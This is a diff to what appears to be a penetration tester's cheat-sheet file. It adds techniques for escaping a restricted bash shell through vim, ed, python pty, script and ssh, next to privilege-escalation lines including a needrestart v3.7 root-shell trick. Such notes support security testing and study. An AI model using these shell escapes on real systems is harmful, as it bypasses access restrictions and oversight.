@@ -9,6 +9,37 @@ crontab -l
 ```
 sudo -u user /bin/bash
 ```
+##Escapeing the restricted shell (rbash)
+```
+Using Editors
+
+    Vim:
+        Open vim: vim
+        Set the shell: :set shell=/bin/bash
+        Launch the shell: `:shell
+
+    Ed:
+        Open ed: ed
+        Execute: `!'/bin/bash'
+
+Using Python
+
+    Python Command:
+        Run: python -c 'import pty; pty.spawn("/bin/bash")'
+        Alternatively: python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+Using Script Command
+
+    Script Command:
+        Execute: /usr/bin/script -qc /bin/bash /dev/null
+
+Using SSH
+
+    SSH with No Profile:
+        Connect using: ssh user@host -t "bash --noprofile"
+
+```
+
 ##needrestart v3.7
 ```
 echo 'system("/bin/bash");' > /tmp/root.sh
